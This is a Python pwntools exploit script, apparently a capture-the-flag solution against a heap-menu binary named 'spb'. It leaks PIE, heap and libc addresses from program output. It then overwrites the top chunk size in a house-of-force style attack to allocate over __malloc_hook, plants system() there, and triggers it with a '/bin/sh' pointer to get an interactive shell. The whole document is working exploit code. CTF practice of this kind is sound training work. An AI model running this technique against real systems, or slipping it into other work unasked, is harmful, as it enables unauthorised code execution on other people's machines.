from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './spb'
HOST = ''
PORT = 0

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])

r.sendlineafter('> ', '0')
r.sendlineafter('> ', 'hoge')
r.sendlineafter('> ', '3')
r.recvuntil('sang ')
leak = int(r.recvuntil(' ')[:-1], 16)
pie = leak - 0xf08
dbg('pie')

target = pie + 0x202048

r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(0x18))
r.sendlineafter('> ', 'hogee')

r.sendlineafter('> ', '3')
r.recvuntil('sang ')
leak = int(r.recvuntil(' ')[:-1], 16)
heap = leak - 0x280
heap_top = heap + 0x290
dbg('heap')


r.sendlineafter('> ', '1')
r.sendlineafter('> ', str((target-heap_top-0x10)))
r.recvuntil('> ')
# pause()
r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(0x2000000))
r.sendlineafter('> ', 'hogeee')

r.sendlineafter('> ', '3')
r.recvuntil('sang ')
leak = int(r.recvuntil(' ')[:-1], 16)
base = leak - 0x10 + 0x2001000
mh = base + 0x3ebc30
system = base + 0x4f4e0
binsh = base + 0x1b40fa
dbg('base')

r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(0x18))
r.sendlineafter('> ', flat(pie+0x202050, 0xdeadbeef)[:-1])

r.sendlineafter('> ', '2')
r.sendlineafter('> ', '0')
r.sendlineafter('> ', '-1')
#pause()

r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(((mh-0x10)-(pie+0x202060)-0x10))) 
r.recvuntil('> ')

r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(0x18))
r.sendlineafter('> ', flat(system))

r.sendlineafter('> ', '1')
r.sendlineafter('> ', str(binsh))
r.interactive()
r.close()
